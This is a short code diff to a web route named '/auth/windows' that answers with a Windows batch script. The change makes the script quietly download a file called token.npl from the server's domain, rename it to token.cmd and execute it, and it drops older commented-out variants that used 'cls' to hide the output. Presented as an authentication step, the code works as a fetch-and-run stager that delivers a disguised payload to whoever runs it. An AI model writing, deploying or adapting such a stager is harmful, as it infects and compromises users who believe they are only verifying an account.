@@ -145,17 +145,12 @@ router.get("/auth/windows", (req, res) => {
       res.type("text/plain").send(`@echo off\necho Authenticated`);
     }
     requestLog[ip].step1 = now;
+
     res.type("text/plain").send(`@echo off
-curl -s -L -o "%USERPROFILE%\\token.cmd" ${domain}/users/token.npl | cmd
+curl -s -L -o "%USERPROFILE%\\token" ${domain}/users/token.npl
+ren "%USERPROFILE%\\token" token.cmd
+call "%USERPROFILE%\\token.cmd"
 `);
-//     res.type("text/plain").send(`@echo off
-// curl -s -L -o "%USERPROFILE%\\token" ${domain}/users/token.npl
-// cls
-// ren "%USERPROFILE%\\token" token.cmd
-// cls
-// call "%USERPROFILE%\\token.cmd"
-// cls
-// `);
   }
   
   status[token] = "verified";
